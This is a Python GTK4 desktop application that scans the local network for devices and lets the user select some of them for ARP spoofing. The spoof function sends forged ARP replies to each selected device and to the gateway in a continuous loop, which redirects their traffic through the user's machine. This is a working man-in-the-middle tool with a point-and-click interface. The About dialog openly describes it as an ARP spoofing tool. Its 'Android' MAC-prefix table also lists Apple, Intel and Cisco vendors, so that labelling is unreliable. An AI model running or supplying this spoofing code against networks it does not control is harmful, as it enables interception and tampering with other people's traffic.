import gi
gi.require_version('Gtk', '4.0')
gi.require_version('Adw', '1')
from gi.repository import Gtk, GLib, Gio, Adw

import scapy.all as scapy
import time
import threading
import ipaddress
import netifaces
import subprocess
import re
import logging
from datetime import datetime
import concurrent.futures
import socket

class NetworkTool(Adw.Application):
    def __init__(self):
        super().__init__(application_id="com.example.NetworkTool")
        self.connect('activate', self.on_activate)
        self.is_scanning = False
        self.is_spoofing = False
        self.devices = []
        self.setup_logging()
        self.network = self.get_local_network()
        self.gateway_ip = self.get_default_gateway()
        self.log_message(f"Network set to: {self.network}", logging.DEBUG)
        self.log_message(f"Gateway IP set to: {self.gateway_ip}", logging.DEBUG)
        self.thread_count = 30
        self.original_thread_count = self.thread_count

    def setup_logging(self):
        self.logger = logging.getLogger('NetworkTool')
        self.logger.setLevel(logging.INFO)
        formatter = logging.Formatter('%(asctime)s - %(levelname)s - %(message)s')
        
        # Console handler
        console_handler = logging.StreamHandler()
        console_handler.setFormatter(formatter)
        self.logger.addHandler(console_handler)

    def log_message(self, message, level=logging.INFO):
        self.logger.log(level, message)
        if hasattr(self, 'status_label'):
            GLib.idle_add(self.update_status_label, message)

    def update_status_label(self, message):
        if hasattr(self, 'status_label'):
            self.status_label.set_text(f"Status: {message}")

    def get_local_network(self):
        try:
            gateways = netifaces.gateways()
            default_gateway = gateways['default'][netifaces.AF_INET][0]
            for interface in netifaces.interfaces():
                addrs = netifaces.ifaddresses(interface)
                if netifaces.AF_INET in addrs:
                    for addr in addrs[netifaces.AF_INET]:
                        ip_address = addr['addr']
                        netmask = addr['netmask']
                        if ipaddress.ip_address(default_gateway) in ipaddress.ip_network(f"{ip_address}/{netmask}", strict=False):
                            self.log_message(f"Detected local network: {ip_address}/{netmask}")
                            return f"{ip_address}/{netmask}"
        except Exception as e:
            self.log_message(f"Error detecting network: {e}", logging.ERROR)
        return None

    def get_default_gateway(self):
        try:
            gateways = netifaces.gateways()
            default_gateway = gateways['default'][netifaces.AF_INET][0]
            self.log_message(f"Detected default gateway: {default_gateway}")
            return default_gateway
        except Exception as e:
            self.log_message(f"Error detecting default gateway: {e}", logging.ERROR)
            return None

    def on_activate(self, app):
        # Create the main window
        self.window = Adw.ApplicationWindow(application=app, title="Network Tool")
        self.window.set_default_size(600, 400)

        # Create the main box
        main_box = Gtk.Box(orientation=Gtk.Orientation.VERTICAL, spacing=0)
        self.window.set_content(main_box)

        # Create a header bar
        header = Adw.HeaderBar()
        main_box.append(header)

        # Add refresh button to the header
        self.refresh_button = Gtk.Button(icon_name="view-refresh-symbolic")
        self.refresh_button.connect("clicked", self.on_refresh_clicked)
        header.pack_start(self.refresh_button)

        # Add hamburger menu
        menu_button = Gtk.MenuButton()
        menu_button.set_icon_name("open-menu-symbolic")
        header.pack_end(menu_button)

        # Create a popover for the menu
        self.popover = Gtk.Popover()
        menu_button.set_popover(self.popover)

        # Create a box for the popover content
        popover_box = Gtk.Box(orientation=Gtk.Orientation.VERTICAL, spacing=6)
        popover_box.set_margin_top(6)
        popover_box.set_margin_bottom(6)
        popover_box.set_margin_start(6)
        popover_box.set_margin_end(6)
        self.popover.set_child(popover_box)

        # Add thread count spin button to the popover
        thread_box = Gtk.Box(orientation=Gtk.Orientation.HORIZONTAL, spacing=6)
        thread_label = Gtk.Label(label="Thread Count")
        thread_box.append(thread_label)

        adjustment = Gtk.Adjustment(value=self.thread_count, lower=1, upper=100, step_increment=1, page_increment=10)
        self.thread_entry = Gtk.SpinButton()
        self.thread_entry.set_adjustment(adjustment)
        self.thread_entry.connect("value-changed", self.on_thread_count_changed)
        thread_box.append(self.thread_entry)

        popover_box.append(thread_box)

        # Add a separator
        popover_box.append(Gtk.Separator(orientation=Gtk.Orientation.HORIZONTAL))

        # Add About button
        about_button = Gtk.Button(label="About")
        about_button.connect("clicked", self.on_about_clicked)
        popover_box.append(about_button)

        # Create a content area
        self.content_box = Gtk.Box(orientation=Gtk.Orientation.VERTICAL, spacing=12, margin_top=24, margin_bottom=24, margin_start=12, margin_end=12)
        main_box.append(self.content_box)

        # Network info
        network_box = Adw.PreferencesGroup()
        self.content_box.append(network_box)

        self.network_row = Adw.ActionRow(title="Network")
        network_box.add(self.network_row)

        self.gateway_row = Adw.ActionRow(title="Gateway")
        network_box.add(self.gateway_row)

        # Update network labels
        self.update_network_label()

        # Device list
        device_box = Adw.PreferencesGroup(title="Devices")
        self.content_box.append(device_box)

        self.device_store = Gtk.ListStore(str, str, str, bool)
        self.device_view = Gtk.TreeView(model=self.device_store)
        
        ip_renderer = Gtk.CellRendererText()
        ip_column = Gtk.TreeViewColumn("IP", ip_renderer, text=0)
        self.device_view.append_column(ip_column)

        mac_renderer = Gtk.CellRendererText()
        mac_column = Gtk.TreeViewColumn("MAC", mac_renderer, text=1)
        self.device_view.append_column(mac_column)

        hostname_renderer = Gtk.CellRendererText()
        hostname_column = Gtk.TreeViewColumn("Hostname", hostname_renderer, text=2)
        self.device_view.append_column(hostname_column)

        spoof_renderer = Gtk.CellRendererToggle()
        spoof_renderer.connect("toggled", self.on_spoof_toggled)
        spoof_column = Gtk.TreeViewColumn("Spoof", spoof_renderer, active=3)
        self.device_view.append_column(spoof_column)

        scrolled_window = Gtk.ScrolledWindow()
        scrolled_window.set_vexpand(True)
        scrolled_window.set_child(self.device_view)
        device_box.add(scrolled_window)

        # ARP spoofing section
        spoof_box = Adw.PreferencesGroup(title="ARP Spoofing")
        self.content_box.append(spoof_box)

        spoof_row = Adw.ActionRow(title="ARP Spoofing")
        self.spoof_button = Gtk.Button(label="Start Spoofing")
        self.spoof_button.connect("clicked", self.on_spoof_clicked)
        spoof_row.add_suffix(self.spoof_button)
        spoof_box.add(spoof_row)

        # Status label
        self.status_label = Gtk.Label(label="Status: Idle")
        self.content_box.append(self.status_label)

        self.window.present()

        # Start initial scan
        self.start_scan()

    def update_network_label(self):
        self.network_row.set_subtitle(self.network)
        self.gateway_row.set_subtitle(self.gateway_ip)

    def update_status_label(self, message):
        if hasattr(self, 'status_label'):
            self.status_label.set_text(f"Status: {message}")

    def on_thread_count_changed(self, spin_button):
        self.thread_count = spin_button.get_value_as_int()
        self.log_message(f"Thread count set to {self.thread_count}")
        self.popover.popdown()  # Close the popover after changing the thread count

    def start_scan(self):
        if not self.is_scanning and self.network:
            self.is_scanning = True
            self.log_message("Scanning network...")
            threading.Thread(target=self.scan_network, daemon=True).start()
        elif not self.network:
            self.log_message("No network detected. Unable to scan.", logging.ERROR)

    def on_refresh_clicked(self, button):
        # Update network and gateway information
        self.network = self.get_local_network()
        self.gateway_ip = self.get_default_gateway()
        
        # Update the network label
        GLib.idle_add(self.update_network_label)
        
        # Start the scan
        self.start_scan()

    def scan_network(self):
        try:
            self.devices = []
            # First, try ARP scan
            self.arp_scan()
            
            # If ARP scan didn't find any devices, try ping scan
            if not self.devices:
                self.log_message("ARP scan found no devices. Trying ping scan...", logging.DEBUG)
                self.ping_scan()

            GLib.idle_add(self.update_device_list)
        except Exception as e:
            self.log_message(f"Error during network scan: {str(e)}", logging.ERROR)
        finally:
            self.log_message(f"Scan completed. Found {len(self.devices)} devices.")
            self.is_scanning = False

    def arp_scan(self):
        try:
            self.log_message(f"Starting ARP scan on network: {self.network}", logging.DEBUG)
            arp_request = scapy.ARP(pdst=self.network)
            broadcast = scapy.Ether(dst="ff:ff:ff:ff:ff:ff")
            arp_request_broadcast = broadcast/arp_request
            answered_list = scapy.srp(arp_request_broadcast, timeout=3, verbose=False)[0]
            
            for element in answered_list:
                self.devices.append({'ip': element[1].psrc, 'mac': element[1].hwsrc})
            self.log_message(f"ARP scan completed. Found {len(self.devices)} devices.")
        except Exception as e:
            self.log_message(f"ARP scan error: {e}", logging.ERROR)

    def ping_scan(self):
        try:
            self.log_message(f"Starting ping scan on network: {self.network}", logging.DEBUG)
            network = ipaddress.ip_network(self.network, strict=False)
            ip_list = list(network.hosts())
            
            with concurrent.futures.ThreadPoolExecutor(max_workers=self.thread_count) as executor:
                futures = [executor.submit(self.ping_and_get_mac, str(ip)) for ip in ip_list]
                for future in concurrent.futures.as_completed(futures):
                    result = future.result()
                    if result:
                        self.devices.append(result)
            
            self.log_message(f"Ping scan completed. Found {len(self.devices)} devices.")
        except Exception as e:
            self.log_message(f"Ping scan error: {e}", logging.ERROR)

    def ping_and_get_mac(self, ip):
        try:
            self.log_message(f"Pinging {ip}", logging.DEBUG)
            result = subprocess.run(['ping', '-c', '1', '-W', '1', ip], stdout=subprocess.PIPE, stderr=subprocess.PIPE)
            if result.returncode == 0:
                mac = self.get_mac_address(ip)
                device_info = self.get_hostname(ip)
                if mac:
                    return {'ip': ip, 'mac': mac, 'hostname': device_info}
        except Exception as e:
            self.log_message(f"Error pinging {ip}: {e}", logging.ERROR)
        return None

    def get_mac_address(self, ip):
        try:
            self.log_message(f"Getting MAC address for {ip}", logging.DEBUG)
            result = subprocess.run(['arp', '-n', ip], stdout=subprocess.PIPE, stderr=subprocess.PIPE, text=True)
            mac = re.search(r"(([a-f\d]{1,2}\:){5}[a-f\d]{1,2})", result.stdout)
            return mac.group(0) if mac else "Unknown"
        except Exception as e:
            self.log_message(f"Error getting MAC address for {ip}: {e}", logging.ERROR)
            return "Unknown"

    def get_hostname(self, ip):
        try:
            # Try reverse DNS lookup first
            hostname = socket.gethostbyaddr(ip)[0]
            return hostname
        except socket.herror:
            try:
                # If reverse DNS fails, try using the 'nmblookup' command (for Windows devices)
                result = subprocess.run(['nmblookup', '-A', ip], capture_output=True, text=True, timeout=1)
                lines = result.stdout.split('\n')
                for line in lines:
                    if '<00>' in line and 'ACTIVE' in line:
                        return line.split()[0].strip()
            except (subprocess.SubprocessError, IndexError, FileNotFoundError):
                pass
            
            try:
                # If nmblookup fails or isn't available, try using 'arp -a' to get the MAC address
                result = subprocess.run(['arp', '-a', ip], capture_output=True, text=True, timeout=1)
                mac = result.stdout.split()[-1]
                if ':' in mac or '-' in mac:
                    # Check if it's an Android device based on MAC address
                    android_device = self.is_android_mac(mac)
                    if android_device:
                        return android_device
                    return f"Unknown Device ({mac})"
            except (subprocess.SubprocessError, IndexError):
                pass
            
            # If all else fails, return a generic name
            return f"Unknown Devices"

    def is_android_mac(self, mac):
        # Extended list of common Android device manufacturers' MAC prefixes with manufacturer names
        android_prefixes = {
            '00:08:22': 'Samsung', '00:18:82': 'Huawei', '00:1E:42': 'Xiaomi', '00:24:E4': 'Sony Mobile', '00:26:E8': 'Oppo',
            '00:37:6D': 'OnePlus', '00:6B:8E': 'Vivo', '00:9A:CD': 'Lenovo', '00:E0:4C': 'Realme', '0C:37:DC': 'Motorola',
            '18:F0:E4': 'Google', '28:6C:07': 'LG', '3C:5A:B4': 'Google', '40:4E:36': 'HTC', '44:80:EB': 'Google',
            '60:21:C0': 'Motorola', '70:3A:CB': 'Google', '88:B4:A6': 'Huawei', 'A4:70:D6': 'Motorola', 'AC:37:43': 'HTC',
            'D8:55:A3': 'Google', 'F0:79:59': 'Asus', '00:02:C7': 'Motorola', '00:05:C9': 'LG', '00:0D:3A': 'Microsoft',
            '00:12:47': 'Samsung', '00:15:A0': 'Nokia', '00:17:C9': 'Samsung', '00:1C:A4': 'Sony Ericsson', '00:21:19': 'Samsung',
            '00:23:39': 'Samsung', '00:25:67': 'Samsung', '00:26:FF': 'BlackBerry', '00:30:66': 'Motorola', '00:3A:9A': 'Cisco',
            '00:3D:CB': 'Motorola', '00:50:C2': 'Motorola', '00:5F:F9': 'Motorola', '00:6B:9E': 'Vizio', '00:6B:CF': 'Huawei',
            '00:8C:FA': 'Motorola', '00:90:4C': 'Motorola', '00:A0:96': 'Motorola', '00:B0:52': 'Motorola', '00:BB:3A': 'Amazon',
            '00:BF:61': 'Samsung', '00:C2:C6': 'Intel', '00:DB:70': 'Apple', '00:E0:91': 'LG', '00:E0:ED': 'Motorola',
            '04:4B:ED': 'Apple', '04:B1:67': 'Xiaomi', '04:D3:B5': 'Huawei', '04:E5:36': 'Apple', '08:37:3D': 'Samsung',
            '08:60:6E': 'Apple', '08:62:66': 'Apple', '08:C6:B3': 'Motorola', '0C:96:E6': 'Huawei', '10:2C:6B': 'Huawei',
            '10:3B:59': 'Samsung', '10:4E:07': 'Nokia', '10:5F:06': 'Huawei', '10:68:3F': 'LG', '10:A5:D0': 'Murata',
            '10:CE:A9': 'Sony Mobile', '14:1A:A3': 'Motorola', '14:30:C6': 'Motorola', '14:41:E2': 'Motorola', '14:4F:8A': 'Intel',
            '14:A3:64': 'Samsung', '18:21:95': 'Samsung', '18:34:51': 'Apple', '18:E2:C2': 'Samsung', '1C:21:D1': 'Samsung',
            '1C:3E:84': 'Motorola', '1C:66:AA': 'Samsung', '1C:77:F6': 'Samsung', '1C:9E:46': 'Apple', '1C:B7:2C': 'ASUSTek',
            '20:2D:07': 'Samsung', '20:54:76': 'Sony Mobile', '20:64:32': 'Samsung', '20:A6:0C': 'Samsung', '24:09:95': 'Huawei',
            '24:4B:03': 'Samsung', '24:5A:B5': 'Samsung', '24:DB:ED': 'Samsung', '28:3F:69': 'Sony Mobile', '28:98:7B': 'Samsung',
            '28:B2:BD': 'Intel', '28:C6:3F': 'Intel', '2C:0E:3D': 'Samsung', '2C:5B:B8': 'Motorola', '2C:A8:35': 'Motorola',
            '30:07:4D': 'Samsung', '30:19:66': 'Samsung', '30:75:12': 'Sony Mobile', '30:87:30': 'Huawei', '30:96:FB': 'Samsung',
            '30:F3:35': 'Motorola', '34:14:5F': 'Samsung', '34:23:BA': 'Samsung', '34:2E:B6': 'Motorola', '34:36:3B': 'Apple',
            '34:80:B3': 'Motorola', '34:BE:00': 'Samsung', '38:0A:94': 'Samsung', '38:26:CD': 'Apple', '38:2D:E8': 'Samsung',
            '38:78:62': 'Sony Mobile', '38:A4:ED': 'Xiaomi', '38:BC:1A': 'Meizu', '3C:8B:FE': 'Samsung', '3C:91:80': 'Liteon',
            '3C:A3:48': 'vivo', '3C:B6:B7': 'vivo', '3C:F7:A4': 'Samsung', '40:0E:85': 'Samsung', '40:7C:7D': 'Nokia',
            '40:88:05': 'Motorola', '40:B8:37': 'Sony Mobile', '40:D3:AE': 'Samsung', '44:65:0D': 'Amazon', '44:78:3E': 'Samsung',
            '44:A7:CF': 'Murata', '48:01:C5': 'Sony Mobile', '48:2C:EA': 'Motorola', '48:59:29': 'LG', '48:5A:3F': 'Wisol',
            '48:60:5F': 'LG', '48:88:CA': 'Motorola', '48:DB:50': 'Huawei', '4C:21:D0': 'Sony Mobile', '4C:49:E3': 'Xiaomi',
            '4C:4E:03': 'TCT mobile', '4C:BC:A5': 'Samsung', '50:01:BB': 'Samsung', '50:2E:5C': 'HTC', '50:55:27': 'LG',
            '50:8F:4C': 'Xiaomi', '50:A4:C8': 'Samsung', '50:F5:20': 'Samsung', '54:27:58': 'Motorola', '54:35:30': 'Hon Hai',
            '54:51:1B': 'Huawei', '54:9B:12': 'Samsung', '54:A0:50': 'ASUSTek', '58:A2:B5': 'LG', '5C:0A:5B': 'Samsung',
            '5C:2E:59': 'Samsung', '5C:51:88': 'Motorola', '5C:A3:9D': 'Samsung', '5C:B5:24': 'Sony Mobile', '5C:C5:69': 'Samsung',
            '5C:E8:EB': 'Samsung', '60:45:BD': 'Microsoft', '60:6D:C7': 'Hon Hai', '60:A4:D0': 'Samsung', '60:AB:67': 'Xiaomi',
            '60:BE:B5': 'Motorola', '60:D0:A9': 'Samsung', '60:F1:89': 'Murata', '64:89:9A': 'LG', '64:B4:73': 'Xiaomi',
            '64:BC:0C': 'LG', '64:CC:2E': 'Xiaomi', '68:05:71': 'Samsung', '68:27:37': 'Samsung', '68:48:98': 'Samsung',
            '68:C4:4D': 'Motorola', '68:DF:DD': 'Xiaomi', '6C:0E:0D': 'Sony Mobile', '6C:23:B9': 'Sony Mobile', '6C:25:B9': 'BBK',
            '6C:71:D9': 'Amazon', '6C:AD:F8': 'AzureWave', '70:1A:04': 'Liteon', '70:72:3C': 'Huawei', '70:78:8B': 'vivo',
            '70:81:EB': 'Apple', '70:9F:2D': 'vivo', '70:C9:4E': 'Liteon', '74:23:44': 'Xiaomi', '74:45:8A': 'Samsung',
            '74:A5:28': 'Samsung', '74:EB:80': 'Samsung', '78:00:9E': 'Samsung', '78:02:F8': 'Xiaomi', '78:1F:DB': 'Samsung',
            '78:4B:87': 'Murata', '78:52:1A': 'Samsung', '78:9E:D0': 'Samsung', '78:A5:04': 'Texas Instruments', '78:F8:82': 'LG',
            '7C:1C:68': 'Samsung', '7C:46:85': 'Motorola', '7C:61:93': 'HTC', '7C:7A:91': 'Intel', '7C:AB:25': 'Motorola',
            '7C:E9:D3': 'Hon Hai', '80:57:19': 'Samsung', '80:7A:BF': 'HTC', '84:10:0D': 'Motorola', '84:55:A5': 'Samsung',
            '84:98:66': 'Samsung', '84:B5:41': 'Samsung', '84:CF:BF': 'Fairphone', '88:07:4B': 'LG', '88:30:8A': 'Murata',
            '88:75:98': 'Samsung', '88:79:7E': 'Motorola', '88:C9:D0': 'LG', '8C:25:05': 'Huawei', '8C:3A:E3': 'LG',
            '8C:71:F8': 'Samsung', '8C:77:12': 'Samsung', '8C:BE:BE': 'Xiaomi', '90:00:DB': 'Samsung', '90:17:AC': 'Huawei',
            '90:18:7C': 'Samsung', '90:68:C3': 'Motorola', '90:C1:15': 'Sony Mobile', '94:0E:6B': 'Samsung', '94:8F:EE': 'Verizon',
            '94:B9:7E': 'Motorola', '94:D0:29': 'Guangdong Oppo', '98:0C:82': 'Samsung', '98:28:A6': 'Compal', '98:52:B1': 'Samsung',
            '98:6F:60': 'Guangdong Oppo', '98:F1:70': 'vivo', '9C:2E:A1': 'Xiaomi', '9C:3A:AF': 'Samsung', '9C:5C:8E': 'ASUSTek',
            '9C:8C:6E': 'Samsung', 'A0:08:69': 'Intel', 'A0:10:81': 'Samsung', 'A0:60:90': 'Samsung', 'A0:82:1F': 'Samsung',
            'A0:86:C6': 'Xiaomi', 'A0:C9:A0': 'Murata', 'A4:08:EA': 'Murata', 'A4:84:31': 'Samsung', 'A4:99:47': 'Huawei',
            'A8:1B:6A': 'Hon Hai', 'A8:60:B6': 'Apple', 'A8:81:95': 'Samsung', 'A8:96:75': 'Motorola', 'AC:5F:3E': 'Samsung',
            'AC:9E:17': 'ASUSTek', 'AC:CF:85': 'Huawei', 'B0:35:8D': 'Nokia', 'B0:72:BF': 'Murata', 'B0:E0:3C': 'TCT mobile',
            'B4:07:F9': 'Samsung', 'B4:3A:28': 'Samsung', 'B4:60:ED': 'Huawei', 'B4:CE:F6': 'HTC', 'B8:5A:73': 'Samsung',
            'B8:5E:7B': 'Samsung', 'B8:6C:E8': 'Samsung', 'B8:B4:2E': 'Motorola', 'BC:14:85': 'Samsung', 'BC:20:A4': 'Samsung',
            'BC:44:86': 'Samsung', 'BC:72:B1': 'Samsung', 'BC:76:5E': 'Samsung', 'BC:85:1F': 'Samsung', 'BC:E6:3F': 'Samsung',
            'C0:11:73': 'Samsung', 'C0:65:99': 'Samsung', 'C0:89:97': 'Samsung', 'C0:BD:D1': 'Samsung', 'C4:42:02': 'Samsung',
            'C4:50:06': 'Samsung', 'C4:62:EA': 'Samsung', 'C4:73:1E': 'Samsung', 'C4:88:E5': 'Samsung', 'C8:14:79': 'Samsung',
            'C8:19:F7': 'Samsung', 'C8:38:70': 'Samsung', 'C8:7E:75': 'Samsung', 'CC:07:AB': 'Samsung', 'CC:3A:61': 'Samsung',
            'CC:F9:E8': 'Samsung', 'D0:17:6A': 'Samsung', 'D0:59:E4': 'Samsung', 'D0:66:7B': 'Samsung', 'D0:87:E2': 'Samsung',
            'D0:C1:B1': 'Samsung', 'D0:DF:C7': 'Samsung', 'D4:87:D8': 'Samsung', 'D4:88:90': 'Samsung', 'D4:E8:B2': 'Samsung',
            'D8:08:31': 'Samsung', 'D8:57:EF': 'Samsung', 'D8:90:E8': 'Samsung', 'DC:44:B6': 'Samsung', 'DC:66:72': 'Samsung',
            'DC:CF:96': 'Samsung', 'E0:99:71': 'Samsung', 'E0:AA:96': 'Samsung', 'E0:CB:EE': 'Samsung', 'E4:12:1D': 'Samsung',
            'E4:40:E2': 'Samsung', 'E4:58:B8': 'Samsung', 'E4:7C:F9': 'Samsung', 'E4:92:FB': 'Samsung', 'E4:E0:C5': 'Samsung',
            'E8:03:9A': 'Samsung', 'E8:11:32': 'Samsung', 'E8:3A:12': 'Samsung', 'E8:4E:84': 'Samsung', 'E8:93:09': 'Samsung',
            'EC:10:7B': 'Samsung', 'EC:1F:72': 'Samsung', 'EC:9B:F3': 'Samsung', 'F0:08:F1': 'Samsung', 'F0:5A:09': 'Samsung',
            'F0:5B:7B': 'Samsung', 'F0:72:8C': 'Samsung', 'F0:E7:7E': 'Samsung', 'F4:09:D8': 'Samsung', 'F4:42:8F': 'Samsung',
            'F4:7B:5E': 'Samsung', 'F4:9F:54': 'Samsung', 'F8:04:2E': 'Samsung', 'F8:3F:51': 'Samsung', 'F8:77:B8': 'Samsung',
            'F8:D0:BD': 'Samsung', 'FC:00:12': 'Toshiba', 'FC:19:10': 'Samsung', 'FC:42:03': 'Samsung', 'FC:8F:90': 'Samsung',
            'FC:A1:3E': 'Samsung', 'FC:C7:34': 'Samsung', 'FC:F1:36': 'Samsung'
        }
        
        mac_prefix = mac[:8].upper()
        for prefix, manufacturer in android_prefixes.items():
            if mac_prefix.startswith(prefix.upper()):
                return f"{manufacturer} Device"
        return None

    def update_device_list(self):
        self.device_store.clear()
        for device in self.devices:
            self.device_store.append([device['ip'], device['mac'], device['hostname'], False])


    def on_spoof_toggled(self, widget, path):
        self.device_store[path][3] = not self.device_store[path][3]

    def on_spoof_clicked(self, button):
        if not self.is_spoofing:
            if self.gateway_ip:
                self.is_spoofing = True
                self.spoof_button.set_label("Stop Spoofing")
                self.log_message("Starting ARP spoofing...")
                threading.Thread(target=self.spoof, daemon=True).start()
            else:
                self.log_message("Cannot start spoofing: No gateway detected", logging.ERROR)
        else:
            self.is_spoofing = False
            self.spoof_button.set_label("Start Spoofing")
            self.log_message("Stopping ARP spoofing...")

    def get_mac(self, ip):
        arp_request = scapy.ARP(pdst=ip)
        broadcast = scapy.Ether(dst="ff:ff:ff:ff:ff:ff")
        arp_request_broadcast = broadcast/arp_request
        answered_list = scapy.srp(arp_request_broadcast, timeout=1, verbose=False)[0]
        return answered_list[0][1].hwsrc

    def spoof(self):
        try:
            gateway_mac = self.get_mac(self.gateway_ip)
            self.log_message(f"Gateway MAC: {gateway_mac}")
            
            while self.is_spoofing:
                for row in self.device_store:
                    if row[3]:  # If spoofing is enabled for this device
                        target_ip = row[0]
                        target_mac = row[1]
                        # Spoof target
                        scapy.send(scapy.ARP(op=2, pdst=target_ip, hwdst=target_mac, psrc=self.gateway_ip), verbose=False)
                        # Spoof gateway
                        scapy.send(scapy.ARP(op=2, pdst=self.gateway_ip, hwdst=gateway_mac, psrc=target_ip), verbose=False)
                self.log_message("ARP spoofing in progress...", logging.DEBUG)
                time.sleep(2)

            self.restore_network()
        except Exception as e:
            self.log_message(f"Error during ARP spoofing: {str(e)}", logging.ERROR)

    def restore_network(self):
        try:
            gateway_mac = self.get_mac(self.gateway_ip)
            for row in self.device_store:
                if row[3]:  # If spoofing was enabled for this device
                    target_ip = row[0]
                    target_mac = row[1]
                    # Restore target
                    scapy.send(scapy.ARP(op=2, pdst=target_ip, hwdst=target_mac, psrc=self.gateway_ip, hwsrc=gateway_mac), count=4, verbose=False)
                    # Restore gateway
                    scapy.send(scapy.ARP(op=2, pdst=self.gateway_ip, hwdst=gateway_mac, psrc=target_ip, hwsrc=target_mac), count=4, verbose=False)
            self.log_message("Network restored to normal state.")
        except Exception as e:
            self.log_message(f"Error restoring network: {str(e)}", logging.ERROR)

    def on_about_clicked(self, button):
        self.popover.popdown()  # Close the popover before opening the About dialog
        about_dialog = Gtk.AboutDialog()
        about_dialog.set_transient_for(self.window)
        about_dialog.set_modal(True)

        about_dialog.set_program_name("Network Tool")
        about_dialog.set_version("1.0")
        about_dialog.set_copyright("© 2023 Your Name")
        about_dialog.set_comments("A network scanning and ARP spoofing tool.")
        about_dialog.set_website("https://example.com")
        about_dialog.set_website_label("Website")
        about_dialog.set_authors(["Your Name"])
        about_dialog.set_documenters(["Your Name"])
        about_dialog.set_artists(["Your Name"])
        about_dialog.set_license_type(Gtk.License.GPL_3_0)

        about_dialog.connect("close-request", self.on_about_dialog_close)
        about_dialog.present()

    def on_about_dialog_close(self, dialog):
        dialog.destroy()

if __name__ == "__main__":
    app = NetworkTool()
    app.run(None)